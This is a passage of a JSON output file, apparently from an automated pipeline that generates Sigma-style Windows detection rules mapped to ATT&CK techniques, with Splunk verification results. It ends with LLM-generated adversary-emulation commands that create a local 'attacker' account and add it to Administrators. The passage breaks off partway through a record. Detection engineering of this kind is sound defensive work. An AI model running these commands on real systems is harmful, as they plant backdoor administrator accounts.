        "falsepositives": [
          "Legitimate use of rundll32.exe or regsvr32.exe by administrators or installers that load DLLs from custom application directories",
          "Software that deploys plugins via these binaries in non\u2011system locations"
        ],
        "level": "medium",
        "tags": [
          "attack.t1574.001",
          "attack.defense_evasion",
          "attack.execution"
        ],
        "ttp_id": "unknown",
        "technique_name": "Hijack Execution Flow: DLL Side-Loading",
        "generation_method": "langchain",
        "id": "b1044af7-f7cb-453e-a6f9-57026f01df93",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 23,
          "query_time_ms": 1002.0
        }
      },
      {
        "title": "Detect Potential Rootkit Deployment via Kernel Structure Manipulation",
        "description": "Detects execution of generic Windows binaries (rundll32.exe, sc.exe) with command\u2011line arguments that reference kernel structures or driver installation, indicative of attempts to hide system processes by modifying ActiveProcessLinks, EPROCESS, or UniqueProcessId.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_rundll_apl": {
            "Image|endswith": "\\rundll32.exe",
            "CommandLine|contains": "ActiveProcessLinks"
          },
          "selection_rundll_upid": {
            "Image|endswith": "\\rundll32.exe",
            "CommandLine|contains": "UniqueProcessId"
          },
          "selection_sc_driver": {
            "Image|endswith": "\\sc.exe",
            "CommandLine|contains": "driver"
          },
          "condition": "selection_rundll_apl or selection_rundll_upid or selection_sc_driver"
        },
        "falsepositives": [
          "Legitimate use of rundll32.exe for system utilities (e.g., control.exe, dllhost.exe)",
          "Authorized creation or start of legitimate drivers via sc.exe"
        ],
        "level": "high",
        "tags": [
          "attack.t1014",
          "attack.defense_evasion"
        ],
        "ttp_id": "unknown",
        "technique_name": "Hide System Processes",
        "generation_method": "langchain",
        "id": "ec522ca5-7528-4156-baac-2234be165412",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 2,
          "query_time_ms": 526.0
        }
      },
      {
        "title": "Masquerading with Validly Signed System Binaries in Unusual Paths",
        "description": "Detects execution of Windows system binaries that are signed with a valid code signing certificate but are run from locations outside the standard System32 directory, indicating possible masquerading.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "svchost": {
            "Image|endswith": "\\svchost.exe",
            "SignatureStatus": "Valid"
          },
          "explorer": {
            "Image|endswith": "\\explorer.exe",
            "SignatureStatus": "Valid"
          },
          "rundll32": {
            "Image|endswith": "\\rundll32.exe",
            "SignatureStatus": "Valid"
          },
          "benign_path": {
            "Image|contains": "System32"
          },
          "condition": "(svchost or explorer or rundll32) and not benign_path"
        },
        "falsepositives": [
          "Legitimate administrative tools or custom scripts that copy signed system binaries to non\u2011standard directories for testing or deployment.",
          "Software packaging or deployment solutions that stage signed executables in temporary locations before moving them."
        ],
        "level": "high",
        "tags": [
          "attack.t1036",
          "attack.defense_evasion"
        ],
        "ttp_id": "unknown",
        "technique_name": "Masquerading",
        "generation_method": "langchain",
        "id": "0fe22702-355e-468c-8a4b-d1845adf4a53",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 42,
          "query_time_ms": 1186.0
        }
      },
      {
        "title": "Exfiltration Over C2 Channel via Native Windows Utilities",
        "description": "Detects potential data exfiltration over a C2 channel when native Windows tools (PowerShell, certutil, bitsadmin) are executed with command\u2011line arguments that indicate outbound HTTP/HTTPS transfers or encoded payloads.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell_http": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "http://"
          },
          "selection_powershell_https": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "https://"
          },
          "selection_certutil_http": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": "http://"
          },
          "selection_bitsadmin_http": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": "http://"
          },
          "selection_powershell_exfil": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "-enc"
          },
          "condition": "selection_powershell_http or selection_powershell_https or selection_certutil_http or selection_bitsadmin_http or selection_powershell_exfil"
        },
        "falsepositives": [
          "Legitimate PowerShell scripts that download updates or files from trusted internal or external sources using Invoke-WebRequest or Invoke-RestMethod.",
          "System administrators using certutil.exe to retrieve certificates or test connectivity.",
          "Bitsadmin.exe employed by Windows Update, deployment tools, or legitimate file transfer scripts.",
          "PowerShell or other utilities used in automated patching or configuration management that include encoded commands for convenience."
        ],
        "level": "medium",
        "tags": [
          "attack.t1041",
          "attack.exfiltration",
          "attack.command_and_control",
          "custom.windows",
          "custom.sysmon",
          "custom.process_creation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over C2 Channel",
        "generation_method": "langchain",
        "id": "cc30996d-b13d-4827-8a9e-bf99b99d6c04",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 7,
          "query_time_ms": 782.0
        }
      },
      {
        "title": "Detect Use of Code Signing Tools for Obtaining Signing Certificates",
        "description": "Detects execution of code signing utilities (signtool, certutil, makecert, certreq) or PowerShell Set-AuthenticodeSignature, which may indicate attackers obtaining or using code signing certificates to sign malware.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_signtool": {
            "Image|endswith": "\\signtool.exe",
            "CommandLine|contains": "sign"
          },
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": "-store"
          },
          "selection_certutil_csp": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": "-csp"
          },
          "selection_certutil_repair": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": "-repairstore"
          },
          "selection_makecert": {
            "Image|endswith": "\\makecert.exe"
          },
          "selection_certreq": {
            "Image|endswith": "\\certreq.exe"
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "Set-AuthenticodeSignature"
          },
          "condition": "selection_signtool or selection_certutil or selection_certutil_csp or selection_certutil_repair or selection_makecert or selection_certreq or selection_powershell"
        },
        "falsepositives": [
          "Legitimate code signing performed by developers or build pipelines",
          "System administrators using certutil for certificate management",
          "Software packaging tools that invoke signtool during build",
          "Internal PKI enrollment processes using certreq.exe"
        ],
        "level": "medium",
        "tags": [
          "attack.t1588.006",
          "attack.defense_evasion"
        ],
        "ttp_id": "unknown",
        "technique_name": "Obtain Capabilities: Code Signing Certificates",
        "generation_method": "langchain",
        "id": "eb25deb5-29f4-4af4-bfcd-3104e693d372",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 7,
          "query_time_ms": 475.00000000000006
        }
      },
      {
        "title": "Detect Milestone Backdoor Execution via Service Creation Commands",
        "description": "Detects execution of the Milestone backdoor when it is launched through Windows service creation utilities (sc.exe, services.exe, svchost.exe). This aligns with ATT&CK technique T1543.003 (System Services: Service Execution).",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_sc": {
            "Image|endswith": "\\sc.exe",
            "CommandLine|contains": "milestone"
          },
          "selection_services": {
            "Image|endswith": "\\services.exe",
            "CommandLine|contains": "milestone"
          },
          "selection_svchost": {
            "Image|endswith": "\\svchost.exe",
            "CommandLine|contains": "milestone"
          },
          "condition": "selection_sc or selection_services or selection_svchost"
        },
        "falsepositives": [
          "Legitimate use of sc.exe by administrators to create or configure services",
          "Normal operation of svchost.exe and services.exe loading legitimate DLLs",
          "Scheduled tasks or deployment tools that invoke sc.exe with custom service names"
        ],
        "level": "high",
        "tags": [
          "attack.t1543.003",
          "attack.execution",
          "custom.milestone",
          "custom.service_execution"
        ],
        "ttp_id": "unknown",
        "technique_name": "System Services: Service Execution",
        "generation_method": "langchain",
        "id": "d17c4191-8ddf-430f-9a96-77b85b2c6037",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 3,
          "query_time_ms": 544.0
        }
      },
      {
        "title": "Detect Registry Modification of CRTSYS Service or HHIVE GetCellRoutine Manipulation",
        "description": "Detects execution of regedit.exe, modifications to the CRTSYS service registry key, or command lines containing GetCellRoutine, indicating possible HHIVE manipulation for registry hiding.",
        "logsource": {
          "category": "registry",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_process": {
            "Image|endswith": "\\\\regedit.exe"
          },
          "selection_reg": {
            "TargetObject|contains": "\\\\REGISTRY\\\\MACHINE\\\\SYSTEM\\\\CURRENTCONTROLSET\\\\SERVICES\\\\CRTSYS"
          },
          "selection_hhive": {
            "CommandLine|contains": "GetCellRoutine"
          },
          "condition": "selection_process or selection_reg or selection_hhive"
        },
        "falsepositives": [
          "Legitimate administrative use of regedit.exe to edit system settings",
          "Windows updates or installers that modify the CRTSYS service configuration",
          "Debugging or development tools that interact with registry keys"
        ],
        "level": "high",
        "tags": [
          "attack.t1112",
          "attack.defense_evasion",
          "attack.modify_registry"
        ],
        "ttp_id": "unknown",
        "technique_name": "Modify Registry",
        "generation_method": "langchain",
        "id": "8814460d-b81f-47bd-87a3-d8533650b55a",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 7,
          "query_time_ms": 450.0
        }
      },
      {
        "title": "Suspicious Driver Process Access Request for PROCESS_TERMINATE Permission",
        "description": "Detects Sysmon ProcessAccess events where a driver (identified by a .sys image) requests the PROCESS_TERMINATE permission via the DesiredAccess field, indicating possible virtualization or sandbox evasion.",
        "logsource": {
          "category": "process_access",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_driver": {
            "Image|endswith": ".sys"
          },
          "selection_access": {
            "DesiredAccess|contains": "PROCESS_TERMINATE"
          },
          "condition": "selection_driver and selection_access"
        },
        "falsepositives": [
          "Legitimate administrative tools (e.g., taskkill.exe, Process Explorer) requesting PROCESS_TERMINATE",
          "System services or drivers that need to terminate child processes as part of normal operation"
        ],
        "level": "high",
        "tags": [
          "attack.t1562.001",
          "attack.defense_evasion",
          "custom.process_access",
          "custom.sandbox_evasion"
        ],
        "ttp_id": "unknown",
        "technique_name": "Virtualization/Sandbox Evasion",
        "generation_method": "langchain",
        "id": "6d01e36a-a185-49d1-bfd4-312789789853",
        "siem_verification": {
          "detected": false,
          "status": "success",
          "message": "Verification complete",
          "events_found": 0,
          "query_time_ms": 654.0
        }
      },
      {
        "title": "Detect Hidden TCP Connection Enumeration via Netstat IOCTL Abuse",
        "description": "Detects execution of netstat.exe with the IOCTL_NSI_GETALLPARAM flag or any process referencing the nsiproxy.sys driver, indicative of a rootkit attempting to hide TCP connections.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|endswith": "\\netstat.exe",
            "CommandLine|contains": "IOCTL_NSI_GETALLPARAM"
          },
          "selection2": {
            "CommandLine|contains": "nsiproxy.sys"
          },
          "condition": "selection1 or selection2"
        },
        "falsepositives": [
          "System administrators running netstat for legitimate troubleshooting",
          "Authorized installation or management of the nsiproxy.sys driver using sc.exe or pnputil.exe"
        ],
        "level": "medium",
        "tags": [
          "attack.discovery",
          "attack.t1046"
        ],
        "ttp_id": "unknown",
        "technique_name": "Network Service Scanning",
        "generation_method": "langchain",
        "id": "eeec3c3f-2637-41ae-af1d-d6edf746c535",
        "siem_verification": {
          "detected": false,
          "status": "success",
          "message": "Verification complete",
          "events_found": 0,
          "query_time_ms": 569.0000000000001
        }
      },
      {
        "title": "Detect Potential Rootkit Driver Loading and PsSetCreateProcessNotifyRoutine Usage",
        "description": "Detects loading of suspicious .sys drivers from temporary directories or execution of processes that reference the PsSetCreateProcessNotifyRoutine API, indicative of rootkit behavior that hides system processes by modifying the EPROCESS ActiveProcessLinks list.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_driver": {
            "EventID": 6,
            "Image|endswith": ".sys",
            "Image|contains": [
              "\\Temp\\",
              "\\AppData\\Local\\Temp\\"
            ]
          },
          "selection_notify": {
            "EventID": 1,
            "CommandLine|contains": "PsSetCreateProcessNotifyRoutine"
          },
          "exclude_dev": {
            "HostName|contains": [
              "dev",
              "test"
            ]
          },
          "condition": "(selection_driver or selection_notify) and not exclude_dev"
        },
        "falsepositives": [
          "Legitimate driver loading from temporary directories during software installations or updates",
          "Debugging or development tools that load custom drivers",
          "Scripts that call PsSetCreateProcessNotifyRoutine for legitimate monitoring purposes"
        ],
        "level": "high",
        "tags": [
          "attack.t1014",
          "attack.defense-evasion",
          "custom.sysmon",
          "custom.windows"
        ],
        "ttp_id": "unknown",
        "technique_name": "Hide System Processes",
        "generation_method": "langchain",
        "id": "a47c6b3f-3050-4a7a-82d4-2276e1ef342e",
        "siem_verification": {
          "detected": false,
          "status": "success",
          "message": "Verification complete",
          "events_found": 0,
          "query_time_ms": 874.0
        }
      },
      {
        "title": "Suspicious PowerShell Execution with Encoded Commands or Unusual Parent Process",
        "description": "Detects PowerShell processes that use encoded commands or are launched from command shells, indicating potential malicious execution.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_ps": {
            "Image|endswith": "\\\\powershell.exe"
          },
          "selection_enc": {
            "CommandLine|contains": "-EncodedCommand"
          },
          "selection_enc_short": {
            "CommandLine|contains": "-enc"
          },
          "selection_nop": {
            "CommandLine|contains": "-nop"
          },
          "selection_parent": {
            "ParentImage|endswith": "cmd.exe"
          },
          "condition": "(selection_ps and (selection_enc or selection_enc_short or selection_nop)) or (selection_ps and selection_parent)"
        },
        "falsepositives": [
          "Legitimate administrative scripts that invoke PowerShell without encoding",
          "System maintenance tools that use PowerShell with -NoProfile or -ExecutionPolicy flags",
          "Windows Update or built\u2011in Windows components that run PowerShell"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1059.001",
          "attack.t1086"
        ],
        "ttp_id": "unknown",
        "technique_name": "PowerShell",
        "generation_method": "langchain",
        "id": "4257fae7-c4f0-4cac-b0ac-18983ea43cf6",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 27,
          "query_time_ms": 495.0
        }
      },
      {
        "title": "Detect Synaptics syn.exe execution loading newdev.dll",
        "description": "Detects execution of syn.exe (signed by Synaptics) with a command line referencing newdev.dll, indicating possible malicious side\u2011loading.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\\syn.exe",
            "CommandLine|contains": "newdev.dll",
            "Signature|contains": "Synaptics",
            "SignatureStatus": "Valid"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate Synaptics driver or software updates that execute syn.exe with newdev.dll",
          "Support or diagnostic tools from Synaptics that use syn.exe"
        ],
        "level": "medium",
        "tags": [
          "attack.execution",
          "attack.t1204"
        ],
        "ttp_id": "unknown",
        "technique_name": "User Execution",
        "generation_method": "langchain",
        "id": "ba105b9a-1c3b-4e1b-aa7a-32d3dac235cb",
        "siem_verification": {
          "detected": false,
          "status": "success",
          "message": "Verification complete",
          "events_found": 0,
          "query_time_ms": 655.0
        }
      },
      {
        "title": "Detect Creation of Administrator Account with Hard\u2011coded Credentials via net.exe",
        "description": "Detects execution of net.exe that creates a new local administrator user named ANONYMOUS with the hard\u2011coded password MileSt0ne2@16, indicating credential dumping or backdoor persistence.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|endswith": "\\net.exe",
            "CommandLine|contains": "ANONYMOUS"
          },
          "selection2": {
            "Image|endswith": "\\net.exe",
            "CommandLine|contains": "MileSt0ne2@16"
          },
          "condition": "selection1 and selection2"
        },
        "falsepositives": [
          "Legitimate administrative scripts that create test accounts named ANONYMOUS with a known password.",
          "Automation tools that use net.exe to provision local accounts with predefined passwords."
        ],
        "level": "high",
        "tags": [
          "attack.t1003",
          "attack.credential_access"
        ],
        "ttp_id": "unknown",
        "technique_name": "Credential Dumping",
        "generation_method": "langchain",
        "id": "64fb9a83-13ca-4b92-a03d-4ad494c41bb6",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 3,
          "query_time_ms": 722.0
        }
      },
      {
        "title": "Phishing: Office Macro Launches Shell with Signed Driver Indicators",
        "description": "Detects WINWORD.EXE spawning PowerShell, cmd.exe, or wscript.exe where the command line references Frostburn Studios or 433CCR Company, indicating possible phishing macro that loads a signed driver.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_process": {
            "Image|endswith": [
              "\\\\powershell.exe",
              "\\\\cmd.exe",
              "\\\\wscript.exe"
            ]
          },
          "selection_parent": {
            "ParentImage|endswith": "\\\\WINWORD.EXE"
          },
          "selection_indicator": {
            "CommandLine|contains": [
              "Frostburn Studios",
              "433CCR Company"
            ]
          },
          "condition": "selection_process and selection_parent and selection_indicator"
        },
        "falsepositives": [
          "Legitimate Office macros that invoke PowerShell or cmd for automation",
          "IT administrators using Office documents to launch scripts for deployment",
          "Security testing tools that simulate macro behavior"
        ],
        "level": "medium",
        "tags": [
          "attack.t1566",
          "attack.initial_access",
          "attack.phishing",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Phishing",
        "generation_method": "langchain",
        "id": "f12db906-671f-4056-8b4b-4afae0442ea3",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 23,
          "query_time_ms": 359.0
        }
      },
      {
        "title": "Detect Potential DKOM Driver Loading via Sysmon Process Creation",
        "description": "Detects processes that load or create kernel drivers, a common precursor to Direct Kernel Object Modification (DKOM) used for Pre\u2011OS Boot persistence.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_sc": {
            "Image|endswith": "\\sc.exe",
            "CommandLine|contains": "type= kernel"
          },
          "selection_drvload": {
            "Image|endswith": "\\drvload.exe"
          },
          "selection_devcon": {
            "Image|endswith": "\\devcon.exe"
          },
          "selection_rundll32": {
            "Image|endswith": "\\rundll32.exe",
            "CommandLine|contains": "ntdll.dll"
          },
          "condition": "selection_sc or selection_drvload or selection_devcon or selection_rundll32"
        },
        "falsepositives": [
          "Legitimate driver installations performed by IT or software installers",
          "Windows Update installing kernel drivers",
          "Hardware device driver updates via vendor tools",
          "System administration scripts that load drivers for testing"
        ],
        "level": "medium",
        "tags": [
          "attack.persistence",
          "attack.t1014"
        ],
        "ttp_id": "unknown",
        "technique_name": "Pre-OS Boot",
        "generation_method": "langchain",
        "id": "e014b2a5-b909-455c-9e08-0c63c0f7d742",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 82,
          "query_time_ms": 419.0
        }
      },
      {
        "title": "Deletion of Known Malicious Artifacts via Cmd or PowerShell",
        "description": "Detects execution of cmd.exe or powershell.exe with a delete command targeting known malicious files (1.bat, 1.dll) which indicates indicator removal on host.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd_del": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "del"
          },
          "selection_ps_del": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "del"
          },
          "selection_target1": {
            "CommandLine|contains": "1.bat"
          },
          "selection_target2": {
            "CommandLine|contains": "1.dll"
          },
          "condition": "(selection_cmd_del or selection_ps_del) and (selection_target1 or selection_target2)"
        },
        "falsepositives": [
          "Legitimate administrative scripts that delete temporary or log files named 1.bat or 1.dll",
          "Software installers or cleanup utilities that use generic file names matching the indicators"
        ],
        "level": "medium",
        "tags": [
          "attack.t1070",
          "attack.defense_evasion",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Indicator Removal on Host",
        "generation_method": "langchain",
        "id": "d59b7e4d-a7f1-4922-af01-871bc0b15ebb",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 24,
          "query_time_ms": 3341.0
        }
      },
      {
        "title": "Suspicious Creation or Modification of System Processes via Service Utilities",
        "description": "Detects creation or modification of system processes by monitoring use of sc.exe, PowerShell encoded commands, cmd.exe invoking sc, and regsvr32 with installation flags, which are common techniques for establishing persistence.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image|endswith": "\\\\sc.exe",
            "CommandLine|contains": "create"
          },
          "selection2": {
            "Image|endswith": "\\\\powershell.exe",
            "CommandLine|contains": "-EncodedCommand"
          },
          "selection3": {
            "Image|endswith": "\\\\cmd.exe",
            "CommandLine|contains": "sc create"
          },
          "selection4": {
            "Image|endswith": "\\\\regsvr32.exe",
            "CommandLine|contains": "/i"
          },
          "condition": "selection1 or selection2 or selection3 or selection4"
        },
        "falsepositives": [
          "Legitimate administrators creating or configuring services with sc.exe",
          "PowerShell scripts using -EncodedCommand for authorized automation",
          "System maintenance scripts invoking regsvr32.exe to register COM components",
          "Batch files or deployment tools using cmd.exe to run sc create for valid services"
        ],
        "level": "medium",
        "tags": [
          "attack.persistence",
          "attack.t1543",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Create or Modify System Process",
        "generation_method": "langchain",
        "id": "bb15d553-3a5c-40c5-9b58-b54ceb0b56de",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 24,
          "query_time_ms": 423.0
        }
      },
      {
        "title": "Suspicious Use of Application Layer Protocol Utilities",
        "description": "Detects processes that use common utilities (PowerShell, cmd, certutil) to perform network operations over application-layer protocols, indicating possible Command and Control activity.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_ps_invoke": {
            "Image|contains": "powershell.exe",
            "CommandLine|contains": "Invoke-WebRequest"
          },
          "selection_ps_http": {
            "Image|contains": "powershell.exe",
            "CommandLine|contains": "http://"
          },
          "selection_ps_https": {
            "Image|contains": "powershell.exe",
            "CommandLine|contains": "https://"
          },
          "selection_cmd_curl": {
            "Image|contains": "cmd.exe",
            "CommandLine|contains": "curl "
          },
          "selection_cmd_wget": {
            "Image|contains": "cmd.exe",
            "CommandLine|contains": "wget "
          },
          "selection_certutil": {
            "Image|contains": "certutil.exe",
            "CommandLine|contains": "-urlcache"
          },
          "condition": "selection_ps_invoke or selection_ps_http or selection_ps_https or selection_cmd_curl or selection_cmd_wget or selection_certutil"
        },
        "falsepositives": [
          "Legitimate administrative scripts using PowerShell to download updates or packages.",
          "Software installers or patching tools that invoke curl, wget, or certutil for legitimate file retrieval.",
          "System maintenance tasks that use PowerShell Invoke-WebRequest for configuration management."
        ],
        "level": "medium",
        "tags": [
          "attack.t1071",
          "attack.command_and_control",
          "custom.application_layer_protocol"
        ],
        "ttp_id": "unknown",
        "technique_name": "Application Layer Protocol",
        "generation_method": "langchain",
        "id": "af85c73a-0128-4d07-add8-490bf128bc76",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 27,
          "query_time_ms": 502.0
        }
      },
      {
        "title": "Archive Collected Data \u2013 Detect Creation of Archive Files",
        "description": "Detects processes that create archive files (e.g., .zip, .7z, .tar, .rar) using common archiving utilities or PowerShell Compress-Archive, indicating potential data collection and packaging for exfiltration.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_7z": {
            "Image|endswith": "\\7z.exe",
            "CommandLine|contains": ".7z"
          },
          "selection_zip": {
            "Image|endswith": "\\7z.exe",
            "CommandLine|contains": ".zip"
          },
          "selection_winrar": {
            "Image|endswith": "\\winrar.exe",
            "CommandLine|contains": ".rar"
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "Compress-Archive"
          },
          "selection_tar": {
            "Image|endswith": "\\tar.exe",
            "CommandLine|contains": ".tar"
          },
          "selection_cab": {
            "Image|endswith": "\\makecab.exe"
          },
          "condition": "selection_7z or selection_zip or selection_winrar or selection_powershell or selection_tar or selection_cab"
        },
        "falsepositives": [
          "Legitimate backup or archiving scripts run by administrators",
          "Scheduled tasks that compress log files for rotation",
          "Software installers that package files using 7z or tar",
          "PowerShell scripts using Compress-Archive for routine maintenance"
        ],
        "level": "medium",
        "tags": [
          "attack.t1560",
          "attack.collection",
          "custom.process_creation",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "generation_method": "langchain",
        "id": "333e5bee-e0ab-4c0a-bc72-f5d305a8bff6",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 6,
          "query_time_ms": 536.0
        }
      },
      {
        "title": "Suspicious Modification of Registry Run Keys",
        "description": "Detects creation or modification of registry values under Run or RunOnce keys, which are commonly used for persistence. Excludes known benign svchost.exe modifications.",
        "logsource": {
          "category": "registry",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "TargetObject|contains": "Run"
          },
          "filter": {
            "Image|endswith": "\\svchost.exe"
          },
          "condition": "selection and not filter"
        },
        "falsepositives": [
          "Legitimate software installers adding entries to Run keys",
          "Windows Update or other OS components updating Run keys",
          "Antivirus or security tools that register services via Run keys"
        ],
        "level": "medium",
        "tags": [
          "attack.persistence",
          "attack.t1547.001"
        ],
        "ttp_id": "unknown",
        "technique_name": "Registry Run Keys",
        "generation_method": "langchain",
        "id": "dc90d6d3-71fd-4343-8e96-592d4af8ebe7",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 3,
          "query_time_ms": 595.0
        }
      }
    ],
    "status": "success"
  },
  "evaluation": {
    "status": "success",
    "summary": {
      "average_quality_score": 0.8169354838709678
    }
  },
  "attacks": [
    {
      "id": "a75c81bd-158e-44cf-8d68-7b967685a088",
      "ttp_id": "9c163b8b-a435-4b6a-a7e4-525826c6fe85",
      "technique_id": "9c163b8b-a435-4b6a-a7e4-525826c6fe85",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "windows",
      "command": "net user attacker P@ssw0rd123 /add && net localgroup Administrators attacker /add",
      "description": "Creates a new local user 'attacker' with a password and adds them to the local Administrators group using legacy net.exe.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "On execution with admin privileges, a new user 'attacker' is created and added to the Administrators group. Fails silently if not elevated.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:47.274857",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.761,
      "validated": true
    },
    {
      "id": "6542894a-ae67-4c5f-8b17-b69671b7c727",
      "ttp_id": "9c163b8b-a435-4b6a-a7e4-525826c6fe85",
      "technique_id": "9c163b8b-a435-4b6a-a7e4-525826c6fe85",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "windows",
      "command": "cmd.exe /c \"net user attacker P@ssw0rd123 /add && net localgroup Administrators attacker /add && echo Backdoor execution simulated > %TEMP%\\beacon.txt\"",
      "description": "Executes a command chain in cmd.exe to create a user, elevate it, and simulate backdoor execution by writing to a temp file.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Creates user 'attacker', adds to Administrators, and writes a benign indicator file in %TEMP%. Requires admin; otherwise, commands fail.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:47.274857",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.761,
      "validated": true
    },
    {
      "id": "c11b6c1c-df49-43e3-9b19-9d39f4578ce2",
      "ttp_id": "9c163b8b-a435-4b6a-a7e4-525826c6fe85",
      "technique_id": "9c163b8b-a435-4b6a-a7e4-525826c6fe85",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "Execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $cmd = 'net user attacker_test P@ssw0rd321 /add'; cmd.exe /c $cmd; Start-Sleep -s 1; $cmd2 = 'net localgroup Administrators attacker_test /add'; cmd.exe /c $cmd2; Set-Content -Path $env:TEMP\\debug_log.txt -Value 'Elevated command executed' -Force } catch { exit 1 }\"",
      "description": "Uses PowerShell to orchestrate the creation of a test user and group elevation via cmd.exe, simulating execution under elevated context with error handling.",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Runs net commands through PowerShell to add a user and grant admin rights. Logs success to %TEMP%\\debug_log.txt. Fails if not run as administrator.",
      "source": "langchain",
      "generated_at": "2025-12-28T12:38:47.274857",
      "agent_id": "ad1f738e-0505-48d0-9301-d8e6198f726f",
      "confidence_score": 0.761,
      "validated": true
    },
    {
      "id": "50cef251-0094-470b-b55d-15a63150f58a",
      "ttp_id": "9c163b8b-a435-4b6a-a7e4-525826c6fe85",
